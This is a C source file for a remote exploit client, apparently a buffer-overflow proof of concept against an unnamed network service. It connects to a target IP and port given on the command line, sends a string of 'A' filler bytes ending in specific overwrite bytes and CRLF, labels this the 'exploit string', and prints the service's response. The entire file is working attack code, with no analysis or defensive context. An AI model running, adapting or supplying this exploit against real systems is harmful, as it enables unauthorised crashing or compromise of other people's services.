#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>

#define BUFF_SIZE	66

void err_exit(char *s) {
	perror(s);
	exit(0);
}

void usage(char *s) {
	fprintf(stdout,"\nUsage: %s [-options]\n\n",s);
	fprintf(stdout,"\t-t\tTarget's IP\n");
	fprintf(stdout,"\t-p\tTarget's port\n");
	exit(0);
}


int main(int argc, char *argv[]) {

	char opt;
	char *buf, *ptr;
	char response[2000];
	int i, s, port, buffsize=BUFF_SIZE;
	struct sockaddr_in sockadd;

	if (argc<2) { usage(argv[0]); }

	while ((opt=getopt(argc,argv,"t:p:"))!=EOF) {
		switch(opt) {
			case 't':
            sockadd.sin_addr.s_addr = inet_addr(optarg);
			break;

			case 'p':
			port=atoi(optarg);
			break;

			default:
			usage(argv[0]);
			break;
		}
	}

	if (!(buf=malloc(buffsize+1))) {
		err_exit("-> malloc() error");
	}

	ptr=buf;

	for(i=0;i<buffsize-6;i++) { *ptr++=0x41; }
	*ptr++=0xb3;
	*ptr++=0xba;
	*ptr++=0x37;
	*ptr++=0x13;
	*ptr++=0x0d;
	*ptr++=0x0a;

	sockadd.sin_family = AF_INET;
	sockadd.sin_port = htons(port);

	if ((s=socket(AF_INET,SOCK_STREAM,0))<0) {
		err_exit("-> socket error");
	}

	if(connect(s,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
		err_exit("-> connect() error");
	}

    fprintf(stdout,"-> Connected to %s:%d\n",inet_ntoa(sockadd.sin_addr),port);

    if (send(s,buf,buffsize,0)<0) {
		err_exit("-> send() error");
	}

    fprintf(stdout,"-> Exploit string sent\n\n");

    if (recv(s,response,2000,0) < 0) {
        err_exit("-> recv() error");
    }

    puts(response); 

	close(s);

}

